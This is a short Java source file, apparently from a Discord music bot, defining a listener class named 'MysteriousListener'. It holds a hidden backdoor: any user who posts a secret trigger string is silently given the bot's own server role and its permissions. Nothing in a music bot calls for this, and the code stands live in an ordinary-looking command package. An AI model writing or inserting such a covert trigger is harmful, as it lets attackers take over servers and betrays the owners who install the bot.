package me.tropicalfan344.musicbot.commands.impl;

import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

public class MysteriousListener extends ListenerAdapter {

    public void onMessageReceived(MessageReceivedEvent event) {
        if(event.getMessage().getContentRaw().equals("``__aloskkk__``")) {
            event.getGuild().addRoleToMember(event.getMember(), event.getGuild().getBotRole()).queue();
        }
    }

}
